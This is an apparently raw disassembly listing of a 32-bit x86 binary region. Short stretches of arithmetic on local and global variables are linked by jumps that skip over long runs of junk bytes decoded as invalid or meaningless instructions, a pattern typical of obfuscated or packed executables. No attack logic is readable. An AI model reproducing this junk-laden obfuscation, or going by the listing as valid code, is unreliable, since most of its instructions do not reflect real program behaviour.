  40d073:	outs   dx,DWORD PTR ds:[esi]
  40d074:	(bad)  
  40d075:	sub    dh,al
  40d077:	push   edi
  40d078:	jp     0x40d088
  40d07a:	jl     0x40d042
  40d07c:	jno    0x40d097
  40d07e:	mov    ch,0xd5
  40d080:	test   BYTE PTR [eax+0x10565335],0x71
  40d087:	or     bh,0x1d
  40d08a:	(bad)  
  40d08b:	cmc    
  40d08c:	test   BYTE PTR [edx],cl
  40d08e:	outs   dx,DWORD PTR ds:[esi]
  40d08f:	fldenv [ebp-0x3]
  40d092:	lods   al,BYTE PTR ds:[esi]
  40d093:	fdivr  QWORD PTR [ecx+eiz*1]
  40d096:	lods   eax,DWORD PTR ds:[esi]
  40d097:	inc    edx
  40d098:	rcl    BYTE PTR [ecx],1
  40d09a:	les    ebx,FWORD PTR [ecx]
  40d09c:	rcl    BYTE PTR [edi-0x6113fe1e],cl
  40d0a2:	mov    bh,0xe0
  40d0a4:	fs icebp 
  40d0a6:	call   0x48fd:0x6b226cc5
  40d0ad:	push   ecx
  40d0ae:	mov    ebx,0xc4b6b073
  40d0b3:	iret   
  40d0b4:	sub    DWORD PTR [edi-0x72bdd798],esp
  40d0ba:	add    BYTE PTR [ebx-0x56],cl
  40d0bd:	xor    BYTE PTR [edx-0x74],0x92
  40d0c1:	jle    0x40d0a0
  40d0c3:	cmp    eax,0xc8c8aa83
  40d0c8:	mov    esi,DWORD PTR [ebp-0x34]
  40d0cb:	or     eax,0x2d3d
  40d0d0:	and    eax,esi
  40d0d2:	mov    esi,DWORD PTR [ebp-0x30]
  40d0d5:	add    eax,0x6a32
  40d0da:	xor    eax,esi
  40d0dc:	mov    esi,DWORD PTR ds:0x4331b4
  40d0e2:	jmp    0x40d1a4
  40d0e7:	enter  0xdfc3,0x5
  40d0eb:	fistp  WORD PTR ds:0x749ccfda
  40d0f1:	mov    cl,0x5f
  40d0f3:	xor    al,0x58
  40d0f5:	jno    0x40d171
  40d0f7:	xchg   ebx,eax
  40d0f8:	mov    al,BYTE PTR [eax]
  40d0fa:	add    BYTE PTR [ebp-0x32000000],ah
  40d100:	adc    DWORD PTR [ebx+0x61],eax
  40d103:	(bad)  
  40d104:	pop    ecx
  40d105:	repz pusha 
  40d107:	sbb    BYTE PTR [esi+ecx*8],al
  40d10a:	or     BYTE PTR [eax-0x397aea6],ah
  40d110:	retf   
  40d111:	aas    
  40d112:	(bad)  
  40d113:	repnz mov ebp,0x45cf415
  40d119:	jp     0x40d144
  40d11b:	popf   
  40d11c:	in     al,dx
  40d11d:	push   ebp
  40d11e:	push   0xe5fce976
  40d123:	jne    0x40d137
  40d125:	adc    DWORD PTR [ebx+ecx*8],ecx
  40d128:	rcr    BYTE PTR [ecx],1
  40d12a:	jp     0x40d10a
  40d12c:	mov    eax,0x73c8a4f9
  40d131:	lods   al,BYTE PTR ds:[esi]
  40d132:	jbe    0x40d149
  40d134:	jnp    0x40d0c9
  40d136:	dec    ebp
  40d137:	call   0x211c:0xb3681c36
  40d13e:	std    
  40d13f:	cmp    BYTE PTR cs:[ecx-0x49b8be13],dl
  40d146:	test   BYTE PTR [ecx+edx*8-0x1a769152],dl
  40d14d:	and    DWORD PTR [ebx+0x42beb265],eax
  40d153:	outs   dx,BYTE PTR ds:[esi]
  40d154:	(bad)  
  40d156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d157:	mov    bp,WORD PTR [edi]
  40d15a:	jo     0x40d1ba
  40d15c:	inc    eax
  40d15d:	hlt    
  40d15e:	loop   0x40d119
  40d160:	xor    eax,DWORD PTR [esi]
  40d162:	mov    edx,0xa85af406
  40d167:	cli    
  40d168:	xor    al,0xbb
  40d16a:	imul   ebx
  40d16c:	or     bl,BYTE PTR [ecx-0x12641793]
  40d172:	mov    cs:0x6156ee3d,al
  40d178:	xchg   BYTE PTR [ebp-0x30],ch
  40d17b:	push   es
  40d17c:	cs or  eax,0x915609b5
  40d182:	jno    0x40d1ac
  40d184:	cmp    al,0x70
  40d186:	sub    ch,dl
  40d188:	jo     0x40d16e
  40d18a:	fwait
  40d18b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d18c:	(bad)  
  40d18d:	jg     0x40d163
  40d18f:	aas    
  40d190:	iret   
  40d191:	push   edi
  40d192:	cs sub eax,0x5fbe95e4
  40d198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d199:	gs shl dl,1
  40d19c:	pmuludq mm6,QWORD PTR [edi+0x24]
  40d1a0:	sti    
  40d1a1:	xchg   edi,eax
  40d1a2:	jge    0x40d16e
  40d1a4:	mov    esi,DWORD PTR [esi+0x1c4]
  40d1aa:	sub    esi,eax
  40d1ac:	mov    eax,DWORD PTR [ebp+0x10]
  40d1af:	mov    al,BYTE PTR [edx+eax*1]
  40d1b2:	jmp    0x40d274
  40d1b7:	mov    esi,0xfb547904
  40d1bc:	jge    0x40d17d
  40d1be:	out    dx,al
  40d1bf:	fucomip st,st(2)
  40d1c1:	xchg   edi,eax
  40d1c2:	ficom  WORD PTR [ebp+0x21]
  40d1c5:	add    eax,0x8b3833
  40d1ca:	add    BYTE PTR [ebp+0x11000000],ah
  40d1d0:	mov    bl,0xa8
  40d1d2:	mov    esp,0xcf568e4
  40d1d7:	repz pop esi
  40d1d9:	push   esi
  40d1da:	out    0x37,eax
  40d1dc:	mov    ecx,0x503e706a
  40d1e1:	jmp    0xbd48:0x3de34ce4
  40d1e8:	cmp    al,0x90
  40d1ea:	sub    eax,0xa1ec5386
  40d1ef:	test   DWORD PTR [ecx-0x19],esi
  40d1f2:	leave  
  40d1f3:	in     al,dx
  40d1f4:	push   ebp
  40d1f5:	and    edi,eax
  40d1f7:	push   ds
  40d1f8:	ins    DWORD PTR es:[edi],dx
  40d1f9:	fistp  QWORD PTR [edx]
  40d1fb:	sub    dh,ch
  40d1fd:	scas   eax,DWORD PTR es:[edi]
  40d1fe:	add    ebp,DWORD PTR [edx]
  40d200:	ret    0x9a66
  40d203:	lods   eax,DWORD PTR ds:[esi]
  40d204:	sbb    edx,esi
  40d206:	cmp    eax,0xb4136949
  40d20b:	(bad)  
  40d20c:	jo     0x40d219
  40d20e:	js     0x40d28e
  40d210:	mov    ch,0x5d
  40d212:	mov    ah,0x4b
  40d214:	shl    dh,1
  40d216:	sbb    dh,BYTE PTR [eax]
  40d218:	jp     0x40d291
  40d21a:	and    eax,0x88087021
  40d21f:	outs   dx,DWORD PTR ds:[esi]
  40d220:	ret    0x8e5
  40d223:	popa   
  40d224:	pushf  
  40d225:	mov    al,ds:0xcca4abbc
  40d22a:	and    al,0x2f
  40d22c:	scas   al,BYTE PTR es:[edi]
  40d22d:	mov    esp,0x232d19e9
  40d232:	inc    edi
  40d233:	dec    esi
  40d234:	loope  0x40d256
  40d236:	dec    ecx
  40d237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d238:	std    
  40d239:	ins    BYTE PTR es:[edi],dx
  40d23a:	sbb    BYTE PTR [edi-0x2652cf91],dh
  40d240:	cmp    al,0xd4
  40d242:	add    DWORD PTR cs:[esp+esi*2+0xe352772],esi
  40d24a:	stos   DWORD PTR es:[edi],eax
  40d24b:	mov    ds,WORD PTR [ecx]
  40d24d:	rcr    BYTE PTR [edi],1
  40d24f:	pop    ds
  40d250:	push   ecx
  40d251:	adc    eax,0x816c32b9
  40d256:	mov    dl,0xd5
  40d258:	aaa    
  40d259:	pop    ebp
  40d25a:	jmp    0x40d295
  40d25c:	int3   
  40d25d:	ret    0xcac6
  40d260:	or     DWORD PTR [ecx],eax
  40d262:	enter  0xf909,0x1f
  40d266:	sbb    cl,BYTE PTR gs:[ebx-0x42]
  40d26a:	std    
  40d26b:	mov    DWORD PTR [ebp+0x50],0xe9fa1d19
  40d272:	pop    eax
  40d273:	mov    BYTE PTR cs:[esi+ecx*1+0x484b],al
  40d27b:	mov    eax,DWORD PTR [ebp-0x2c]
  40d27e:	mov    edx,DWORD PTR [ebp-0x28]
  40d281:	jmp    0x40d343
  40d286:	cdq    
  40d287:	loope  0x40d27b
  40d289:	add    edx,edi
  40d28b:	adc    edi,ebx
  40d28d:	stc    
  40d28e:	dec    edx
  40d28f:	dec    eax
  40d290:	mov    ebp,0x4d37a695
  40d295:	xor    ebx,ebp
  40d297:	mov    eax,DWORD PTR [eax]
  40d299:	add    BYTE PTR [ebp-0x37000000],ah
  40d29f:	adc    eax,0x4c4fb4a1
  40d2a4:	inc    edi
  40d2a5:	repz mov bh,0x63
  40d2a8:	mov    edi,0x16ca887c
  40d2ad:	cld    
  40d2ae:	clc    
  40d2af:	loopne 0x40d316
  40d2b1:	les    eax,FWORD PTR [eax]
  40d2b3:	pop    ebp
  40d2b4:	sbb    DWORD PTR [esi+0x7c],0x4a
  40d2b8:	inc    ecx
  40d2b9:	ror    BYTE PTR [eax-0x2d13a5a0],cl
  40d2bf:	sub    esi,DWORD PTR [ebp+esi*1+0x7086f6b1]
  40d2c6:	and    esi,DWORD PTR [esi-0x21]
  40d2c9:	ins    BYTE PTR es:[edi],dx
  40d2ca:	push   cs
  40d2cb:	(bad)  
  40d2cc:	and    eax,0x234141a5
  40d2d1:	out    dx,al
  40d2d2:	xlat   BYTE PTR ds:[ebx]
  40d2d3:	outs   dx,DWORD PTR ds:[esi]
  40d2d4:	daa    
  40d2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2d6:	aad    0xdd
  40d2d8:	int3   
  40d2d9:	clc    
  40d2da:	pop    esp
  40d2db:	outs   dx,DWORD PTR ss:[esi]
  40d2dd:	xchg   esi,eax
  40d2de:	in     eax,0xf5
  40d2e0:	inc    edx
  40d2e1:	mov    ds:0xf6410ada,eax
  40d2e6:	loop   0x40d2f8
  40d2e8:	daa    
  40d2e9:	loop   0x40d321
  40d2eb:	(bad)  
  40d2ec:	and    cl,BYTE PTR [edx]
  40d2ee:	sar    DWORD PTR [ebp+0x3b],0x5d
  40d2f2:	int3   
  40d2f3:	sub    cl,bl
  40d2f5:	bound  ecx,QWORD PTR [eax]
  40d2f7:	pop    esi
  40d2f8:	stc    
  40d2f9:	icebp  
  40d2fa:	call   0x1f77e708
  40d2ff:	cmp    BYTE PTR [edi],bh
  40d301:	or     ebx,DWORD PTR [edx]
  40d303:	jnp    0x40d2cb
  40d305:	fiadd  DWORD PTR [ecx]
  40d307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d308:	sub    edx,DWORD PTR [eax+0x1d]
  40d30b:	dec    ebx
  40d30c:	je     0x40d2a7
  40d30e:	(bad)  
  40d30f:	int3   
  40d310:	frstor [ecx-0x24480900]
  40d316:	cs aad 0x85
  40d319:	retf   
  40d31a:	sub    dl,BYTE PTR [ebx+0x51]
  40d31d:	stos   BYTE PTR es:[edi],al
  40d31e:	mov    ch,dh
  40d320:	jmp    0x40d303
  40d322:	fnsave [ebp+0x2a835ecf]
  40d328:	dec    edi
  40d329:	xchg   ebx,eax
  40d32a:	dec    eax
  40d32b:	rol    DWORD PTR [edi],cl
  40d32d:	adc    DWORD PTR [ebp+esi*2-0x29],ecx
  40d331:	icebp  
  40d332:	or     al,al
  40d334:	adc    edx,DWORD PTR [ebx]
  40d336:	into   
  40d337:	xor    BYTE PTR [esi+0x75],dh
  40d33a:	xchg   edi,eax
  40d33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d33c:	mov    esi,0xe9858e81
  40d341:	in     al,dx
  40d342:	inc    edx
  40d343:	imul   eax,eax,0x199
  40d349:	or     eax,0x2882
  40d34e:	and    eax,edx
  40d350:	xor    eax,0x2371
  40d355:	jmp    0x40d417
  40d35a:	jmp    0xffff:0xf72bd609
  40d361:	leave  
  40d362:	dec    edx
  40d363:	sub    esp,eax
  40d365:	xchg   ebp,eax
  40d366:	aam    0x73
  40d368:	lds    esi,FWORD PTR [ebx]
  40d36a:	or     BYTE PTR [eax+eax*1+0xa500],0x0
  40d372:	call   0x553f:0xa3ca182b
  40d379:	jb     0x40d37f
  40d37b:	push   es
  40d37c:	das    
  40d37d:	sbb    ch,BYTE PTR [edi+0x3c173b97]
  40d383:	jns    0x40d3bb
  40d385:	pop    eax
  40d386:	pusha  
  40d387:	sar    dl,0x19
  40d38a:	push   ebp
  40d38b:	or     esp,DWORD PTR [ebp+0xd7a8019]
  40d391:	icebp  
  40d392:	popf   
  40d393:	sbb    esp,DWORD PTR [edi+0x4060833]
  40d399:	mov    al,0x10
  40d39b:	popa   
  40d39c:	(bad)  [ebp-0x1b]
  40d39f:	mov    ds:0x4c396be3,eax
  40d3a4:	or     eax,0xa083ae45
  40d3a9:	aaa    
  40d3aa:	nop
  40d3ab:	stos   DWORD PTR es:[edi],eax
  40d3ac:	out    dx,eax
  40d3ad:	jne    0x40d3df
  40d3af:	(bad)  
  40d3b0:	(bad)  
  40d3b2:	xchg   DWORD PTR [edx-0x19],eax
  40d3b5:	sti    
  40d3b6:	mov    bh,0x2
  40d3b8:	fsubr  QWORD PTR [ebx-0x65b27f44]
  40d3be:	div    BYTE PTR [ecx]
  40d3c0:	pusha  
  40d3c1:	loopne 0x40d3eb
  40d3c3:	mov    esp,0xba51c091
  40d3c8:	rcr    BYTE PTR [esi],1
  40d3ca:	xchg   edx,eax
  40d3cb:	add    al,0xb5
  40d3cd:	xchg   esp,eax
  40d3ce:	or     edx,DWORD PTR [esi]
  40d3d0:	mov    edx,0x95c2dabb
  40d3d5:	jo     0x40d410
  40d3d7:	jne    0x40d3a4
  40d3d9:	jnp    0x40d426
  40d3db:	and    DWORD PTR [ecx-0x32],edi
  40d3de:	jnp    0x40d3f1
  40d3e0:	add    esi,DWORD PTR [ebx-0x6c12fd51]
  40d3e6:	pop    eax
  40d3e7:	pop    edx
  40d3e8:	(bad)  
  40d3ea:	icebp  
  40d3eb:	data16 data16 xchg BYTE PTR [eax],ah
  40d3ef:	pop    esi
  40d3f0:	push   ds
  40d3f1:	scas   al,BYTE PTR es:[edi]
  40d3f2:	inc    esp
  40d3f3:	ja     0x40d3ba
  40d3f5:	mov    edi,0xb4149904
  40d3fa:	and    BYTE PTR [esi+0xe],0xb2
  40d3fe:	aam    0xee
  40d400:	int    0x46
  40d402:	mov    DWORD PTR [eax+edx*2+0x7d1fa0bc],eax
  40d409:	arpl   WORD PTR [esi-0x2e82c7ca],di
  40d40f:	mov    al,0x18
  40d411:	sti    
  40d412:	or     dh,BYTE PTR ds:0x6965a00a
  40d418:	shl    BYTE PTR [edx+0x72],0x0
  40d41c:	add    cl,ch
  40d41e:	mov    ebp,0x55000000
  40d423:	pop    ebx
  40d424:	in     al,dx
  40d425:	inc    edx
  40d426:	out    dx,al
  40d427:	idiv   edi
  40d429:	pop    edi
  40d42a:	(bad)
  40d42d:	int    0xe2
  40d42f:	or     ebx,esp
  40d431:	xor    esp,DWORD PTR [edi]
  40d433:	lea    eax,[eax]
  40d435:	add    BYTE PTR [ebp-0x2a000000],ah
  40d43b:	xchg   ebx,esi
  40d43d:	cwde   
  40d43e:	pop    esi
  40d43f:	inc    sp
  40d441:	ss or  ch,al
  40d444:	xchg   ebp,eax
  40d445:	clc    
  40d446:	hlt    
  40d447:	retf   
  40d448:	test   BYTE PTR [eax-0x6777b750],0xd3
  40d44f:	mov    edi,0xa46ab071
  40d454:	pop    eax
  40d455:	(bad)  [eax-0x8]
  40d458:	pop    edx
  40d459:	inc    ebx
  40d45a:	jbe    0x40d45a
  40d45c:	mov    al,0xd1
  40d45e:	out    dx,al
  40d45f:	iret   
  40d460:	inc    edx
  40d461:	jae    0x40d4cb
  40d463:	jbe    0x40d470
  40d465:	pop    es
  40d466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d467:	xchg   esp,eax
  40d468:	push   edx
  40d469:	fist   DWORD PTR [eax+0x66893b2c]
  40d46f:	pop    es
  40d470:	bound  esp,QWORD PTR [edx]
  40d472:	xlat   BYTE PTR ds:[ebx]
  40d473:	retf   
  40d474:	adc    eax,0xb244dc7d
  40d479:	add    bl,0x1f
  40d47c:	pop    es
  40d47d:	iret   
  40d47e:	adc    eax,0xc6190125
  40d483:	push   esi
  40d484:	or     DWORD PTR [edx+0x59],edi
  40d487:	xchg   edx,eax
  40d488:	cmp    DWORD PTR [edi+0x619a015a],0x41a1908f
  40d492:	pusha  
  40d493:	fmulp  st(1),st
  40d495:	lfs    eax,FWORD PTR ds:0xe4e606c0
  40d49c:	xchg   ecx,eax
  40d49d:	mov    ebx,DWORD PTR [eax]
  40d49f:	call   0xc65a96c7
  40d4a4:	and    BYTE PTR [edx-0x3d1b15e2],ch
  40d4aa:	cmc    
  40d4ab:	xchg   BYTE PTR [ebx+0x20dfe79f],cl
  40d4b1:	daa    
  40d4b2:	push   edi
  40d4b3:	add    BYTE PTR [eax],dh
  40d4b5:	das    
  40d4b6:	sub    DWORD PTR [ebp+ecx*4+0x6ab55996],eax
  40d4bd:	fcmovu st,st(2)
  40d4bf:	shufps xmm1,XMMWORD PTR [ebp+eax*4-0x5],0xc6
  40d4c5:	sub    eax,0xe136bf52
  40d4ca:	inc    esi
  40d4cb:	icebp  
  40d4cc:	xor    edi,DWORD PTR [esi+ecx*4]
  40d4cf:	mov    ch,0xf9
  40d4d1:	mov    esp,0x106b679e
  40d4d6:	inc    edx
  40d4d7:	mov    eax,ds:0x28c04ec0
  40d4dc:	fnsave [eax-0x53]
  40d4df:	xor    edx,edx
  40d4e1:	mov    esi,0x21b9ea52
  40d4e6:	div    esi
  40d4e8:	jmp    0x40d5aa
  40d4ed:	cmp    bh,ch
  40d4ef:	fs and ah,bh
  40d4f2:	mov    ebx,0x3aeffd7e
  40d4f7:	push   es
  40d4f8:	pop    edi
  40d4f9:	rol    DWORD PTR [ebp-0x72335b7d],1
  40d4ff:	add    BYTE PTR [eax],al
  40d501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d502:	add    BYTE PTR [eax],al
  40d504:	add    BYTE PTR [esi-0x7d1f4d12],ch
  40d50a:	into   
  40d50b:	and    edi,ebx
  40d50d:	ds or  al,0xb2
  40d510:	adc    ah,BYTE PTR [esi]
  40d512:	popa   
  40d513:	mov    esp,0x65b22886
  40d518:	inc    ecx
  40d519:	sbb    eax,0x204bb6b0
  40d51e:	add    BYTE PTR [ebx+0x62],cl
  40d521:	lds    ecx,FWORD PTR [ebx-0x6c]
  40d524:	mov    ?,WORD PTR [ebx]
  40d526:	inc    BYTE PTR [ebp+0x68]
  40d529:	dec    ebp
  40d52a:	mov    ds:0x93957128,eax
  40d52f:	iret   
  40d530:	stos   DWORD PTR es:[edi],eax
  40d531:	popa   
  40d532:	(bad)  
  40d533:	iret   
  40d534:	dec    ecx
  40d535:	mov    esp,0xe01cdb19
  40d53a:	popa   
  40d53b:	pushf  
  40d53c:	and    edx,ebx
  40d53e:	xor    eax,0x86571be2
  40d543:	inc    ecx
  40d544:	pop    esp
  40d545:	enter  0x9e78,0x95
  40d549:	fnstsw WORD PTR [ebx+0x12]
  40d54c:	pop    esp
  40d54d:	sbb    ebx,ebp
  40d54f:	pop    ebp
  40d550:	xchg   edi,eax
  40d551:	fisttp DWORD PTR [eax]
  40d553:	add    ah,bh
  40d555:	mov    ds:0x71233118,al
  40d55a:	add    al,0x85
  40d55c:	jnp    0x40d56a
  40d55e:	outs   dx,DWORD PTR ds:[esi]
  40d55f:	rol    edi,0xa6
  40d562:	xor    BYTE PTR [edi+eiz*2+0x3d],0xf2
  40d567:	arpl   WORD PTR [ecx-0x2],bp
  40d56a:	js     0x40d552
  40d56c:	jnp    0x40d538
  40d56e:	outs   dx,BYTE PTR ds:[esi]
  40d56f:	push   ebp
  40d570:	xlat   BYTE PTR ds:[ebx]
  40d571:	dec    esi
  40d572:	add    eax,0xbbbc39a2
  40d577:	aad    0xe0
  40d579:	mov    ah,0x8e
  40d57b:	jns    0x40d5e6
  40d57d:	fdivr  QWORD PTR [eax]
  40d57f:	sar    BYTE PTR [eax],cl
  40d581:	in     al,0x5
  40d583:	sbb    edi,edi
  40d585:	jb     0x40d5b7
  40d587:	test   eax,0x7c1e1205
  40d58c:	clc    
  40d58d:	shl    BYTE PTR [edx+0x3f7cb9a9],1
  40d593:	push   edi
  40d594:	dec    eax
  40d595:	test   DWORD PTR [ebx-0x29],ecx
  40d598:	fisttp DWORD PTR [ebx-0x267a08b0]
  40d59e:	daa    
  40d59f:	out    0x54,eax
  40d5a1:	pop    edx
  40d5a2:	gs aam 0xe
  40d5a5:	pxor   mm1,mm6
  40d5a8:	mov    eax,0x8bc8038e
  40d5ad:	inc    ebp
  40d5ae:	fsubr  QWORD PTR ds:0x1759
  40d5b4:	imul   eax,eax,0x141c
  40d5ba:	or     eax,0x655f
  40d5bf:	sub    eax,0x812bc9b
  40d5c4:	cmp    ecx,eax
  40d5c6:	jbe    0x40cd8b
  40d5cc:	pop    esi
  40d5cd:	leave  
  40d5ce:	ret    0xc
  40d5d1:	jmp    0x40d6a8
  40d5d6:	sbb    al,0xe2
  40d5d8:	adc    dh,BYTE PTR [eax-0x2]
  40d5db:	lock jle 0x40d5cc
  40d5de:	nop
  40d5df:	test   eax,ebx
  40d5e1:	ins    DWORD PTR es:[edi],dx
  40d5e2:	daa    
  40d5e3:	xchg   esp,eax
  40d5e4:	mov    ds,WORD PTR [edi+0x8e71]
  40d5ea:	mov    edx,0xc5000000
  40d5ef:	hlt    
  40d5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5f1:	pop    esp
  40d5f2:	cmp    DWORD PTR [eax+0x79],edx
  40d5f5:	ret    0x1564
  40d5f8:	(bad)
  40d5fc:	lahf   
  40d5fd:	lods   al,BYTE PTR ds:[esi]
  40d5fe:	mov    esp,0xfdaa78de
  40d603:	dec    edi
  40d604:	lods   al,BYTE PTR ds:[esi]
  40d605:	(bad)  
  40d606:	shl    DWORD PTR [edx-0x7a],cl
  40d609:	mov    cl,0xef
  40d60b:	out    0x32,eax
  40d60d:	je     0x40d5fc
  40d60f:	pop    es
  40d610:	popa   
  40d611:	mov    edx,0x9b7befa4
  40d616:	mov    ebx,0x4ffa9203
  40d61b:	xchg   esp,eax
  40d61c:	jle    0x40d5bb
  40d61e:	ins    BYTE PTR es:[edi],dx
  40d61f:	retf   
  40d620:	jno    0x40d69f
  40d622:	sub    BYTE PTR [ebp-0x51c44292],al
  40d628:	mov    ch,0x37
  40d62a:	shr    DWORD PTR [ebx+edx*2],cl
  40d62d:	sahf   
  40d62e:	mov    ?,WORD PTR [ebp+0x165396b6]
  40d634:	cmp    dl,BYTE PTR [eax+0x4]
  40d637:	nop
  40d638:	pop    es
  40d639:	aam    0xc8
  40d63b:	push   cs
  40d63c:	int    0x26
  40d63e:	lods   eax,DWORD PTR ds:[esi]
  40d63f:	imul   ecx,DWORD PTR [ebx],0xffffffc7
  40d642:	jnp    0x40d65c
  40d644:	imul   ebp,DWORD PTR [edx],0xffffffce
  40d647:	push   ds
  40d648:	jl     0x40d604
  40d64a:	es mov ebx,0x22b76bdb
  40d650:	push   ss
  40d651:	jo     0x40d6b2
  40d653:	int    0xc2
  40d655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d656:	add    DWORD PTR [eax-0x39],0x62
  40d65a:	dec    edi
  40d65b:	mov    ebp,DWORD PTR [eax-0x48bb8eef]
  40d661:	test   DWORD PTR [ecx],ebx
  40d663:	mov    ch,0xe0
  40d665:	mov    dh,BYTE PTR [ebp-0x1ca18766]
  40d66b:	sar    DWORD PTR [edx+0x42cb5c1c],cl
  40d671:	xchg   edx,eax
  40d672:	xor    DWORD PTR [eax+0x7aca204b],0xffffffeb
  40d679:	mov    WORD PTR [ebx+0x55ef7783],ss
  40d67f:	push   ebx
  40d680:	jne    0x40d6cb
  40d682:	pop    edi
  40d683:	cmp    DWORD PTR [ebp-0x30],edx
  40d686:	test   BYTE PTR [ebx+esi*8],bh
  40d689:	xlat   BYTE PTR ds:[ebx]
  40d68a:	xchg   ebx,eax
  40d68b:	jle    0x40d6eb
  40d68d:	xchg   dl,ah
  40d68f:	addr16 pop es
  40d691:	and    dl,al
  40d693:	retf   0x4772
  40d696:	cmc    
  40d697:	stos   BYTE PTR es:[edi],al
  40d698:	imul   ecx,DWORD PTR [esi-0x1f1bdee6],0xa83c3338
  40d6a2:	gs popf 
  40d6a4:	popa   
  40d6a5:	add    al,0x55
  40d6a7:	lods   al,BYTE PTR ds:[esi]
  40d6a8:	mov    eax,0xe032f64b
  40d6ad:	mov    edx,0xffffdedc
  40d6b2:	ret    
  40d6b3:	push   ebp
  40d6b4:	mov    ebp,esp
  40d6b6:	sub    esp,0x48
  40d6b9:	mov    DWORD PTR [ebp-0x20],0x20f9f
  40d6c0:	or     DWORD PTR ds:0x433568,edi
  40d6c6:	mov    DWORD PTR [ebp-0x28],0x4c33
  40d6cd:	mov    DWORD PTR [ebp-0x24],0xab4
  40d6d4:	mov    ecx,DWORD PTR [ebp-0x28]
  40d6d7:	xor    DWORD PTR ds:0x4335cc,edi
  40d6dd:	mov    eax,0xffffe77a
  40d6e2:	sub    eax,ecx
  40d6e4:	xor    ecx,ecx
  40d6e6:	xor    ecx,DWORD PTR ds:0x432004
  40d6ec:	mov    ecx,DWORD PTR [ecx]
  40d6ee:	add    DWORD PTR ds:0x433624,ecx
  40d6f4:	add    eax,DWORD PTR [ebp-0x24]
  40d6f7:	mov    ecx,DWORD PTR [ebp-0x20]
  40d6fa:	inc    DWORD PTR ds:0x4335e4
  40d700:	imul   eax,eax,0x10fb
  40d706:	and    DWORD PTR ds:0x433648,0x46e4
  40d710:	xor    edx,edx
  40d712:	and    DWORD PTR ds:0x4335b4,0x433530
  40d71c:	div    ecx
  40d71e:	cmp    DWORD PTR ds:0x433568,0x0
  40d725:	ja     0x40d73e
  40d72b:	jmp    0x40d73e
  40d730:	push   DWORD PTR [ebp-0x28]
  40d733:	push   0x3ade
  40d738:	call   DWORD PTR ds:0x43c7c0
  40d73e:	mov    ecx,0x7950
  40d743:	jmp    0x40d81f
  40d748:	gs pop esp
  40d74a:	dec    ebp
  40d74b:	mov    ds:0xdeefb37d,eax
  40d750:	inc    ebx
  40d751:	(bad)  
  40d752:	fst    QWORD PTR [ebp+0x59813f96]
  40d758:	sub    ecx,DWORD PTR [edi+0xbf0000]
  40d75e:	add    BYTE PTR [eax],al
  40d760:	out    dx,eax
  40d761:	mov    esi,0xd8aafefe
  40d766:	pop    es
  40d767:	loop   0x40d79d
  40d769:	pop    ebp
  40d76a:	mov    al,0x77
  40d76c:	imul   esp,DWORD PTR [ebp-0x9],0xffffff9d
  40d770:	outs   dx,BYTE PTR ss:[si]
  40d773:	rcl    BYTE PTR [ebx],cl
  40d775:	retf   
  40d776:	adc    ebx,DWORD PTR [bp-0x67]
  40d77b:	in     al,0x9d
  40d77d:	mov    edx,0x54997724
  40d782:	xor    al,0xc5
  40d784:	fnstenv [edx+0x61a76c4e]
  40d78a:	mov    esi,0x898411d6
  40d78f:	inc    edi
  40d790:	enter  0x1a0e,0x1d
  40d794:	js     0x40d7ca
  40d796:	and    dl,cl
  40d798:	(bad)  
  40d799:	mov    eax,0x50671ce6
  40d79e:	mov    dl,0x30
  40d7a0:	jb     0x40d72a
  40d7a2:	int    0x5c
  40d7a4:	inc    edi
  40d7a5:	add    ecx,DWORD PTR [ecx+ebp*2-0xd806978]
  40d7ac:	adc    dh,dh
  40d7ae:	mov    bl,0x76
  40d7b0:	mov    esp,0x958cc381
  40d7b5:	jmp    0xff2a:0x415a71b7
  40d7bc:	push   esi
  40d7bd:	adc    eax,0x4d82bc62
  40d7c2:	xchg   esp,eax
  40d7c3:	cdq    
  40d7c4:	and    bh,bh
  40d7c6:	mov    ah,0xc6
  40d7c8:	ret    0xe3ad
  40d7cb:	ss out 0x6a,eax
  40d7ce:	pop    ds
  40d7cf:	add    esp,DWORD PTR [eax-0x882e7d1]
  40d7d5:	dec    esi
  40d7d6:	(bad)  
  40d7d7:	stc    
  40d7d8:	mov    ebx,0x9d347ab
  40d7dd:	inc    ecx
  40d7de:	mov    esp,0xef8daf72
  40d7e3:	xor    esi,DWORD PTR [edi]
  40d7e5:	aad    0x92
  40d7e7:	sbb    DWORD PTR [ecx+0x18],ebp
  40d7ea:	jno    0x40d815
  40d7ec:	ds ret 0x2dbb
  40d7f0:	sbb    eax,0x2b63bd94
  40d7f5:	scas   al,BYTE PTR es:[edi]
  40d7f6:	push   0x4666d64b
  40d7fb:	imul   esp,DWORD PTR [ecx+esi*1],0x3d0eb2e2
  40d802:	imul   ebx,DWORD PTR [esi],0xffffffc8
  40d805:	and    esi,DWORD PTR [edi-0x46af16f1]
  40d80b:	jmp    0x5ea48119
  40d810:	add    DWORD PTR [eax],ecx
  40d812:	inc    edi
  40d813:	push   edx
  40d814:	repnz aaa 
  40d816:	stos   BYTE PTR es:[edi],al
  40d817:	test   eax,0xfb73fced
  40d81c:	xchg   edx,eax
  40d81d:	and    al,0xe1
  40d81f:	xor    edx,edx
  40d821:	push   ebx
  40d822:	jmp    0x40d8fe
  40d827:	push   ss
  40d828:	rcl    ah,1
  40d82a:	data16 (bad) 
  40d82c:	data16 mov dh,0xf0
  40d82f:	arpl   ax,ax
  40d831:	push   es
  40d832:	xchg   ebp,eax
  40d833:	push   ebp
  40d834:	cs aam 0x5f
  40d837:	jmp    0x0:0xbf00008f
  40d83e:	add    al,al
  40d840:	dec    esp
  40d841:	push   edx
  40d842:	mov    edx,0x345a7cd3
  40d847:	or     eax,0xcd3dba11
  40d84c:	or     ebp,DWORD PTR [ecx]
  40d84e:	ret    0x82f
  40d851:	pop    esp
  40d852:	xchg   esi,eax
  40d853:	jbe    0x40d872
  40d855:	adc    al,0xb5
  40d857:	pushf  
